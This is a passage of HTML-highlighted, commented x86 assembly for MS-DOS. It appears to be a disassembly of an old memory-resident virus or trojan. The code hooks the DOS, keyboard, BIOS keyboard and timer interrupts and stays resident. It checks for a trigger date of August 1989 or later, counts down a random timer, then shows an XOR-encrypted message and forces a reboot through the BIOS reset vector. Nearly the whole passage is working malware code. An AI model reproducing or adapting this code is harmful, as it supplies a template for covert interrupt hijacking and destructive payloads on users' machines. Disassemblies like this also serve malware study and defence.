    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">           </span><span class="sc1">; \ Clear registers</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">           </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">          </span><span class="sc1">; \
    MOV AX,OFFSET BP0050    ;  ) Set up return address</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">          </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0EAH</span><span class="sc0">            </span><span class="sc1">; \ Far jump to move instruction</span><span class="sc0">
    </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc5">BW03FC</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; /</span><span class="sc0">

</span><span class="sc5">BP0050</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc0">           </span><span class="sc1">; \
    MOV SS,AX           ;  ) Set up internal stack</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SP</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">ENDADR</span><span class="sc4">+</span><span class="sc2">100H</span><span class="sc0">   </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">; \ Address page zero</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc9">ASSUME</span><span class="sc0">  </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">RAM</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc4">:</span><span class="sc10">NOTHING</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">SS_ST1</span><span class="sc0">       </span><span class="sc1">; \ Restore system area data (1)</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">BW03FC</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">       </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc5">SS_ST2</span><span class="sc0">       </span><span class="sc1">; \ Restore system area data (2)</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">BB03FE</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">       </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">SP</span><span class="sc0">           </span><span class="sc1">; Get stack pointer</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">            </span><span class="sc1">; \ Convert to paragraphs</span><span class="sc0">
    </span><span class="sc6">SHR</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">CL</span><span class="sc0">           </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">10H</span><span class="sc0">          </span><span class="sc1">; Allow for PSP</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">SET_PA</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">       </span><span class="sc1">; Save number of paragraphs</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc5">ST_ES1</span><span class="sc0">       </span><span class="sc1">; Get original ES</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">4AH</span><span class="sc0">          </span><span class="sc1">; Set block</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service (Set block)</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">3521H</span><span class="sc0">        </span><span class="sc1">; Get interrupt 21H</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service (Get int)</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">I21OFF</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">       </span><span class="sc1">; Save interrupt 21H offset</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">I21SEG</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc0">       </span><span class="sc1">; Save interrupt 21H segment</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">          </span><span class="sc1">; \ Set DS to CS</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">          </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc9">ASSUME</span><span class="sc0">  </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">CODE</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">BP0170</span><span class="sc0">    </span><span class="sc1">; Interrupt 21H routine</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">2521H</span><span class="sc0">        </span><span class="sc1">; Set interrupt 21H</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service (Set int)</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc5">ST_ES1</span><span class="sc0">       </span><span class="sc1">; Get original ES</span><span class="sc0">
    </span><span class="sc9">ASSUME</span><span class="sc0">  </span><span class="sc8">ES</span><span class="sc4">:</span><span class="sc5">RAM</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc4">:</span><span class="sc5">ENV_SG</span><span class="sc0">        </span><span class="sc1">; Get environment segment</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">DI</span><span class="sc0">           </span><span class="sc1">; Start of environment</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">7FFFH</span><span class="sc0">        </span><span class="sc1">; Allow for 32K environment</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">           </span><span class="sc1">; Search for zero</span><span class="sc0">
</span><span class="sc5">BP0060</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">REPNZ</span><span class="sc0">   </span><span class="sc6">SCASB</span><span class="sc0">           </span><span class="sc1">; Find zero</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">],</span><span class="sc8">AL</span><span class="sc0">      </span><span class="sc1">; Is following character zero</span><span class="sc0">
    </span><span class="sc6">LOOPNZ</span><span class="sc0">  </span><span class="sc5">BP0060</span><span class="sc0">          </span><span class="sc1">; Search again if not</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">DI</span><span class="sc0">           </span><span class="sc1">; Save pointer</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">            </span><span class="sc1">; Address pathname</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4B00H</span><span class="sc0">        </span><span class="sc1">; Load and execute program</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">          </span><span class="sc1">; \ Set DS to ES</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">          </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">          </span><span class="sc1">; \ Set ES to CS</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">          </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc9">ASSUME</span><span class="sc0">  </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">RAM</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc4">:</span><span class="sc10">NOTHING</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">PPB_01</span><span class="sc0">    </span><span class="sc1">; PPB (for load and execute)</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">          </span><span class="sc1">; \ Set DS to CS</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">          </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc9">ASSUME</span><span class="sc0">  </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">CODE</span><span class="sc0">

        </span><span class="sc1">; Install interrupt 9 routine</span><span class="sc0">

    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">3509H</span><span class="sc0">        </span><span class="sc1">; Get interrupt 9</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service (Get int)</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">I09OFF</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">       </span><span class="sc1">; Save interrupt 9 offset</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">I09SEG</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc0">       </span><span class="sc1">; Save interrupt 9 segment</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">2509H</span><span class="sc0">        </span><span class="sc1">; Set interrupt 9</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">BP0150</span><span class="sc0">    </span><span class="sc1">; Interrupt 9 routine</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service (Set int)</span><span class="sc0">

    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">2AH</span><span class="sc0">          </span><span class="sc1">; Get date</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service (Get date)</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">07C5H</span><span class="sc0">        </span><span class="sc1">; Year = 1989</span><span class="sc0">
    </span><span class="sc6">JL</span><span class="sc0">  </span><span class="sc5">BP0070</span><span class="sc0">          </span><span class="sc1">; Branch if before</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">            </span><span class="sc1">; Month = August</span><span class="sc0">
    </span><span class="sc6">JL</span><span class="sc0">  </span><span class="sc5">BP0070</span><span class="sc0">          </span><span class="sc1">; Branch if before</span><span class="sc0">

        </span><span class="sc1">; Install interrupt 16H routine</span><span class="sc0">

    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">OUT_SW</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; Set off output switch</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">3516H</span><span class="sc0">        </span><span class="sc1">; Get interrupt 16H</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service (Get int)</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">I16OFF</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">       </span><span class="sc1">; Save interrupt 16H offset</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">I16SEG</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc0">       </span><span class="sc1">; Save interrupt 16H segment</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">2516H</span><span class="sc0">        </span><span class="sc1">; Set interrupt 16H</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">BP0540</span><span class="sc0">    </span><span class="sc1">; Interrupt 16H routine</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service (Set int)</span><span class="sc0">

</span><span class="sc5">BP0070</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc5">BB046C</span><span class="sc0">       </span><span class="sc1">; Get low byte of system clock</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BH</span><span class="sc4">,</span><span class="sc8">BL</span><span class="sc0">           </span><span class="sc1">; Copy</span><span class="sc0">
    </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">0F00FH</span><span class="sc0">       </span><span class="sc1">; Isolate nibbles</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; Is low nibble of clock zero?</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">BP0080</span><span class="sc0">          </span><span class="sc1">; Branch if not</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">            </span><span class="sc1">; Bits to move</span><span class="sc0">
    </span><span class="sc6">SHR</span><span class="sc0"> </span><span class="sc8">BH</span><span class="sc4">,</span><span class="sc8">CL</span><span class="sc0">           </span><span class="sc1">; Move top nibble to bottom</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">BH</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; Is second nibble of clock zero?</span><span class="sc0">
    </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">BP0080</span><span class="sc0">          </span><span class="sc1">; Branch if yes</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">; Clear register</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">TCOUNT1</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">      </span><span class="sc1">; Set timer count (low)</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">BH</span><span class="sc0">           </span><span class="sc1">; Get second nibble of system clock</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">TCOUNT2</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">      </span><span class="sc1">; Set timer count (high)</span><span class="sc0">

        </span><span class="sc1">; Install interrupt 8 routine</span><span class="sc0">

    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">3508H</span><span class="sc0">        </span><span class="sc1">; Get interrupt 8</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service (Get int)</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">I08OFF</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">       </span><span class="sc1">; Save interrupt 8 offset</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">I08SEG</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc0">       </span><span class="sc1">; Save interrupt 8 segment</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">2508H</span><span class="sc0">        </span><span class="sc1">; Set interrupt 8</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">BP0100</span><span class="sc0">    </span><span class="sc1">; Interrupt 8 routine</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service (Set int)</span><span class="sc0">

</span><span class="sc5">BP0080</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
    </span><span class="sc9">ASSUME</span><span class="sc0">  </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc10">NOTHING</span><span class="sc0">
    </span><span class="sc6">PUSHF</span><span class="sc0">               </span><span class="sc1">; Fake an interrupt</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">INT_21</span><span class="sc0">          </span><span class="sc1">; Interrupt 21H (Load and execute)</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">          </span><span class="sc1">; \ Set ES to DS</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">          </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">49H</span><span class="sc0">          </span><span class="sc1">; Free allocated memory</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service (Free memory)</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">4DH</span><span class="sc0">          </span><span class="sc1">; Get return code of child process</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service (Get return code)</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">31H</span><span class="sc0">          </span><span class="sc1">; Keep process</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">ENDADR</span><span class="sc0">    </span><span class="sc1">; Length of program</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">            </span><span class="sc1">; \ Convert to paragraphs</span><span class="sc0">
    </span><span class="sc6">SHR</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">CL</span><span class="sc0">           </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">10H</span><span class="sc0">          </span><span class="sc1">; Add length of PSP</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service (Keep process)</span><span class="sc0">

    </span><span class="sc1">; Interrupt 24H</span><span class="sc0">

</span><span class="sc5">BP0090</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">           </span><span class="sc1">; Ignore the error</span><span class="sc0">
    </span><span class="sc6">IRET</span><span class="sc0">

    </span><span class="sc1">; Interrupt 8</span><span class="sc0">

</span><span class="sc5">BP0100</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc5">TCOUNT1</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">; \ Subtract from timer count</span><span class="sc0">
    </span><span class="sc6">SBB</span><span class="sc0"> </span><span class="sc5">TCOUNT2</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc5">BP0140</span><span class="sc0">          </span><span class="sc1">; Branch if not zero</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc5">TCOUNT1</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; Is low count zero?</span><span class="sc0">
    </span><span class="sc6">JNZ</span><span class="sc0"> </span><span class="sc5">BP0140</span><span class="sc0">          </span><span class="sc1">; Branch if not</span><span class="sc0">
</span><span class="sc5">BP0110</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">          </span><span class="sc1">; \ Set DS to CS</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">          </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">            </span><span class="sc1">; Mode three</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">10H</span><span class="sc0">         </span><span class="sc1">; VDU I/O</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">            </span><span class="sc1">; Move cursor</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BH</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; Page zero</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">0A14H</span><span class="sc0">        </span><span class="sc1">; Row ten column twenty</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">10H</span><span class="sc0">         </span><span class="sc1">; VDU I/O</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">STRNG8</span><span class="sc0">    </span><span class="sc1">; Address message</span><span class="sc0">
</span><span class="sc5">BP0120</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">BP0120</span><span class="sc0">          </span><span class="sc1">; Delay between characters</span><span class="sc0">
    </span><span class="sc6">LODSB</span><span class="sc0">               </span><span class="sc1">; Get a character</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; Is that the end?</span><span class="sc0">
    </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">BP0130</span><span class="sc0">          </span><span class="sc1">; Branch if yes</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">0AFH</span><span class="sc0">         </span><span class="sc1">; Decrypt character</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">14</span><span class="sc0">           </span><span class="sc1">; Write in TTY mode</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">10H</span><span class="sc0">         </span><span class="sc1">; VDU I/O</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">BP0120</span><span class="sc0">          </span><span class="sc1">; Next character</span><span class="sc0">
    
</span><span class="sc5">BP0130</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0EAH</span><span class="sc0">            </span><span class="sc1">; Far jump to BIOS initialisation</span><span class="sc0">
    </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0FFF0H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F000H</span><span class="sc0">

</span><span class="sc5">BP0140</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">INT_08</span><span class="sc0">          </span><span class="sc1">; Interrupt 8</span><span class="sc0">

    </span><span class="sc1">; Interrupt 9</span><span class="sc0">

    </span><span class="sc9">ASSUME</span><span class="sc0">  </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">RAM</span><span class="sc0">
</span><span class="sc5">BP0150</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">; \ Address zero</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">IN</span><span class="sc0">  </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">60H</span><span class="sc0">          </span><span class="sc1">; Get keyboard token</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc5">BB0417</span><span class="sc0">       </span><span class="sc1">; Get key states</span><span class="sc0">
    </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">            </span><span class="sc1">; Alt key depressed?</span><span class="sc0">
    </span><span class="sc6">JZ</span><span class="sc0">  </span><span class="sc5">BP0160</span><span class="sc0">          </span><span class="sc1">; Branch if not</span><span class="sc0">
    </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">            </span><span class="sc1">; Ctrl key depressed?</span><span class="sc0">
